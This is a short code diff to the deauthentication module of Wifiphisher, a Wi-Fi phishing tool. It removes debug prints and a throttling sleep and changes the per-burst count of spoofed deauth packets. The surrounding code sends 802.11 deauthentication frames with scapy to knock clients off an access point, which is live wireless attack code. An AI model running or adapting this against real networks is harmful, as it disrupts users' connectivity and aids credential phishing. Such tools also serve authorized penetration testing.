@@ -3,7 +3,6 @@ This module handles all the deauthentication required for Wifiphisher.
 """
 
 import threading
-import time
 import scapy.layers.dot11 as dot11
 import scapy.sendrecv
 
@@ -61,9 +60,6 @@ class Deauthentication(object):
                         packet.addr2 not in self._observed_clients and
                         packet.addr2 is not None):
                     # add new client to the list
-                    print packet.addr1
-                    print packet.addr2
-                    print
                     self._observed_clients.append(packet.addr2)
                 elif (packet.addr2 == self._ap_bssid and
                       packet.addr1 != broadcast_address and
@@ -127,7 +123,6 @@ class Deauthentication(object):
         # continue to deauthenticate until otherwise set
         while self._should_continue:
             # added to reduce the stress on system and allow user to connect
-            time.sleep(3)
             if self._observed_clients:
                 for client in self._observed_clients:
 
@@ -138,7 +133,7 @@ class Deauthentication(object):
                                           addr3=self._ap_bssid) /
                               dot11.Dot11Deauth())
 
-                    scapy.sendrecv.sendp(packet, count=10, verbose=False)
+                    scapy.sendrecv.sendp(packet, count=1, verbose=False)
 
     def deauthenticate(self):
         """
